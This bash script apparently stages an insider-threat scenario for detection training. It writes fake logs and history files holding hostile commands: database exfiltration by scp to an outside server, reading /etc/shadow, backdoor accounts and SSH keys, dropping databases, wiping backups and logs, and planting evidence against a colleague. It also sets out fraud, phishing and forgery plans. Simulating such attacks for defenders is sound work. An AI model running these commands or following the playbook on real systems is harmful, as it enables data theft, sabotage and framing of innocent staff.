#!/bin/bash

# Insider Threat Simulation
# Simulates malicious insider activity with legitimate access abuse

echo "[INSIDER THREAT SIMULATION] Deploying insider threat scenario..."

INSIDER_USER="dbuser"
INSIDER_ROLE="Database Administrator"
THREAT_TYPE="Data Theft and Sabotage"

# 1. Legitimate Access Abuse
echo "  [1] Simulating legitimate access abuse..."
cat << 'EOF' >> /home/dbuser/.bash_history
# Legitimate database activities (normal)
mysql -u root -p company_db
SELECT * FROM users WHERE role='admin';
mysqldump company_db > /tmp/daily_backup.sql
systemctl status mysql

# Suspicious activities mixed with legitimate ones
SELECT * FROM customers WHERE credit_card IS NOT NULL;
SELECT * FROM employees WHERE salary > 100000;
mysqldump --all-databases > /home/dbuser/all_databases.sql
cp /home/dbuser/all_databases.sql /tmp/.hidden/
scp /tmp/.hidden/all_databases.sql user@external-server.com:/uploads/
rm /home/dbuser/all_databases.sql

# Privilege escalation attempts
sudo cat /etc/shadow
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/sudoers

# Data sabotage preparation
mysql -u root -p -e "SHOW DATABASES;"
mysql -u root -p -e "DROP DATABASE test_db;"
mysql -u root -p -e "CREATE USER 'backdoor'@'%' IDENTIFIED BY 'secret123';"
mysql -u root -p -e "GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';"

# Anti-forensics
history -c
shred -vfz -n 3 /home/dbuser/sensitive_query.sql
EOF

# 2. After Hours Activity
echo "  [2] Creating after-hours activity patterns..."
# Simulate login during non-business hours
logger -p auth.info "sshd[$(shuf -i 2000-9999 -n 1)]: Accepted password for dbuser from 192.168.1.50 port 22 ssh2 - $(date -d '2024-10-06 23:45:00')"
logger -p auth.info "sshd[$(shuf -i 2000-9999 -n 1)]: Accepted password for dbuser from 192.168.1.50 port 22 ssh2 - $(date -d '2024-10-07 02:15:00')"
logger -p auth.info "sshd[$(shuf -i 2000-9999 -n 1)]: Accepted password for dbuser from 192.168.1.50 port 22 ssh2 - $(date -d '2024-10-07 06:30:00')"

# 3. Data Exfiltration
echo "  [3] Setting up data exfiltration artifacts..."
mkdir -p /tmp/.insider_theft
cat << 'EOF' > /tmp/.insider_theft/exfiltrated_data.txt
# Data Stolen by Insider Threat
File: customer_database.sql (15.2 MB)
  - 50,000 customer records with PII
  - Credit card information (masked)
  - Customer transaction history

File: employee_records.csv (2.8 MB)
  - Complete HR database
  - Salary information
  - Social Security Numbers
  - Performance reviews

File: financial_reports.xlsx (5.1 MB)
  - Quarterly financial statements
  - Revenue projections
  - Cost analysis data
  - Profit margins by product

File: vendor_contracts.zip (12.7 MB)
  - Supplier agreements
  - Pricing information
  - Contract terms and conditions
  - Vendor contact information

File: source_code.tar.gz (45.3 MB)
  - Proprietary application source code
  - Database schemas
  - API documentation
  - Development roadmap
EOF

# Create staged data
mkdir -p /home/dbuser/Documents/backup
echo "Sensitive customer data exported for analysis" > /home/dbuser/Documents/backup/customer_export.sql
echo "Employee salary and benefits data" > /home/dbuser/Documents/backup/hr_export.csv
echo "Financial reporting data Q3 2024" > /home/dbuser/Documents/backup/finance_q3.xlsx

# 4. USB Device Usage
echo "  [4] Simulating USB device insertion..."
logger "kernel: usb 1-1: new high-speed USB device number 2 using ehci-hcd"
logger "kernel: usb 1-1: New USB device found, idVendor=0781, idProduct=5567"
logger "kernel: usb 1-1: Product: Cruzer Blade"
logger "kernel: usb 1-1: Manufacturer: SanDisk"
logger "kernel: sd 8:0:0:0: [sdb] 31293440 512-byte logical blocks: (16.0 GB/14.9 GiB)"

# Create USB mount evidence
mkdir -p /media/dbuser/USB_DRIVE
echo "Files copied to USB device by dbuser on $(date)" > /media/dbuser/USB_DRIVE/copy_log.txt

# 5. Email Exfiltration
echo "  [5] Creating email exfiltration traces..."
mkdir -p /tmp/.email_traces
cat << 'EOF' > /tmp/.email_traces/sent_emails.txt
# Suspicious Email Activity
From: dbuser@company.com
To: personal.email@gmail.com
Subject: Database backup files
Attachments: customer_backup.zip (15.2 MB)
Timestamp: 2024-10-07 01:23:45

From: dbuser@company.com  
To: competitor.contact@rival-corp.com
Subject: Consulting opportunity
Attachments: financial_analysis.xlsx (5.1 MB)
Timestamp: 2024-10-07 02:45:12

From: dbuser@company.com
To: personal.email@gmail.com
Subject: Work files backup
Attachments: source_code.tar.gz (45.3 MB)
Timestamp: 2024-10-07 03:15:33
EOF

# 6. Sabotage Activities
echo "  [6] Setting up sabotage artifacts..."
mkdir -p /tmp/.sabotage
cat << 'EOF' > /tmp/.sabotage/sabotage_commands.txt
# Database Sabotage Commands Executed
mysql -u root -p -e "DROP DATABASE customer_analytics;"
mysql -u root -p -e "DELETE FROM audit_logs WHERE timestamp < '2024-10-01';"
mysql -u root -p -e "UPDATE user_accounts SET active=0 WHERE role='admin';"

# File System Sabotage
rm -rf /var/backups/database/* 
shred -vfz -n 3 /var/log/mysql/mysql.log
find /home/webadmin/projects -name "*.sql" -delete

# Configuration Sabotage  
echo "# Database access disabled by security policy" >> /etc/mysql/mysql.conf.d/mysqld.cnf
echo "bind-address = 127.0.0.1" >> /etc/mysql/mysql.conf.d/mysqld.cnf
EOF

# 7. Insider Trading / Corporate Espionage
echo "  [7] Creating corporate espionage artifacts..."
mkdir -p /tmp/.espionage
cat << 'EOF' > /tmp/.espionage/competitor_contact.txt
# Communication with Competitor
Contact: James Wilson <j.wilson@rival-corp.com>
Role: VP of Business Development, Rival Corp
Purpose: Intelligence sharing agreement

Shared Information:
- Customer acquisition strategies
- Pricing models and profit margins  
- Product roadmap and release schedules
- Key supplier relationships and contracts
- Internal organizational structure
- Employee compensation packages

Payment Arrangement:
- $50,000 initial payment (Bitcoin: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh)
- $10,000 monthly retainer for ongoing intelligence
- Bonus payments for high-value information

Meeting Schedule:
- Initial meeting: Coffee shop, downtown (2024-09-15)
- Regular check-ins: Every 2 weeks
- Emergency contact: encrypted messaging app
EOF

# 8. System Administration Abuse
echo "  [8] Simulating admin privilege abuse..."
cat << 'EOF' >> /root/.bash_history
# Legitimate admin activities
systemctl status mysql
tail -f /var/log/mysql/error.log
ps aux | grep mysql

# Suspicious admin activities  
useradd -m -s /bin/bash insider_backup
echo "insider_backup:BackupUser123!" | chpasswd
usermod -aG sudo insider_backup

# Create backdoor access
mkdir -p /home/insider_backup/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDInsiderBackdoorKey insider@personal-laptop" > /home/insider_backup/.ssh/authorized_keys

# Disable logging
systemctl stop auditd
systemctl disable auditd
> /var/log/auth.log
> /var/log/syslog

# Plant evidence against colleague
echo "malicious_script.sh executed by webadmin" >> /var/log/security_events.log
touch -t 202410070200.00 /home/webadmin/suspicious_file.txt
EOF

# 9. Financial Fraud Simulation
echo "  [9] Creating financial fraud artifacts..."
mkdir -p /tmp/.financial_fraud
cat << 'EOF' > /tmp/.financial_fraud/fraud_activities.txt
# Financial Fraud Activities
Database Modifications:
- Updated payment routing information for vendor payments
- Modified employee direct deposit information  
- Created fictitious vendor accounts
- Altered invoice amounts in accounts payable

Modified Records:
Vendor ID: V-9876543
Name: Consulting Services LLC (Fictitious)
Payment Account: Personal account 987654321
Total Fraudulent Payments: $125,000

Employee Payroll Manipulation:
- Increased personal salary by $500/month
- Created phantom employees for payroll fraud
- Redirected terminated employee paychecks

Investment Account Access:
- Unauthorized trading in company investment accounts
- Insider trading using non-public financial information
- Cryptocurrency purchases using company funds
EOF

# 10. Social Engineering Internal Targets
echo "  [10] Setting up social engineering artifacts..."
mkdir -p /tmp/.social_engineering
cat << 'EOF' > /tmp/.social_engineering/phishing_internal.txt
# Internal Phishing Campaign by Insider
Target: IT Administrator (admin@company.com)
Method: Fake security alert requiring password reset
Credential Harvested: admin:AdminPass2024!

Target: HR Manager (hr.manager@company.com)  
Method: Fake CEO request for employee information
Data Obtained: Complete employee database access

Target: Finance Director (finance@company.com)
Method: Urgnt wire transfer request from "CEO"
Result: Attempted $50,000 fraudulent transfer

Phishing Infrastructure:
- Internal email spoofing
- Fake intranet login pages
- USB drops in parking lot/cafeteria
- Social media reconnaissance on employees
EOF

# 11. Document Forgery
echo "  [11] Creating document forgery evidence..."
mkdir -p /tmp/.forgery
cat << 'EOF' > /tmp/.forgery/forged_documents.txt
# Forged Documents Created
Document: Board Resolution - Executive Bonus Approval
Purpose: Authorize fictitious $75,000 bonus payment
Signature Forged: CEO, CFO signatures

Document: Vendor Agreement Amendment  
Purpose: Increase payment rates to shell company
Forged Authorization: Procurement Manager signature

Document: Employee Termination Letter
Purpose: Frame colleague for misconduct
Backdated: 2024-09-15 (predating actual incident)

Document Creation Tools:
- PDF editor for signature manipulation
- Corporate letterhead templates
- Digital signature spoofing software
EOF

# 12. Data Destruction Timeline
echo "  [12] Creating data destruction timeline..."
mkdir -p /tmp/.destruction_timeline
cat << 'EOF' > /tmp/.destruction_timeline/destruction_plan.txt
# Data Destruction Timeline (Covering Tracks)
Phase 1: Immediate (Day of Discovery)
- Clear browser history and downloads
- Delete email evidence  
- Wipe temporary files and caches
- Clear database query history

Phase 2: Short-term (1-3 days)
- Overwrite log files with legitimate entries
- Remove USB device traces
- Delete staged files
- Clear command history

Phase 3: Long-term (1 week)
- Plant false evidence against colleagues
- Create alibis for suspicious timeframes
- Destroy physical evidence (documents, storage devices)
- Prepare resignation letter citing "hostile work environment"

Tools Used:
- Secure file deletion (shred, wipe)
- Log manipulation scripts
- Timestamp modification utilities
- Evidence planting mechanisms
EOF

echo "[INSIDER THREAT SIMULATION] Insider threat scenario complete!"
echo ""
echo "INSIDER: $INSIDER_USER ($INSIDER_ROLE)"
echo "THREAT TYPE: $THREAT_TYPE"
echo "MOTIVATION: Financial gain + Revenge"
echo "ACCESS LEVEL: Privileged database administrator"
echo ""
echo "Simulated Insider Activities:"
echo "  1. Legitimate Access Abuse"
echo "  2. After-Hours Suspicious Activity"
echo "  3. Large-Scale Data Exfiltration"
echo "  4. USB Device Data Theft"
echo "  5. Email-Based Information Sharing"
echo "  6. System Sabotage"
echo "  7. Corporate Espionage"
echo "  8. Administrative Privilege Abuse"
echo "  9. Financial Fraud"
echo "  10. Internal Social Engineering"
echo "  11. Document Forgery"
echo "  12. Evidence Destruction"
echo ""
echo "MITRE ATT&CK TTPs Simulated:"
echo "  - T1078: Valid Accounts"
echo "  - T1119: Automated Collection"  
echo "  - T1005: Data from Local System"
echo "  - T1052.001: Exfiltration over USB"
echo "  - T1041: Exfiltration Over C2"
echo "  - T1485: Data Destruction"
echo "  - T1565: Data Manipulation"
echo "  - T1070: Indicator Removal"
echo "  - T1087: Account Discovery"
echo "  - T1566.001: Spearphishing Attachment"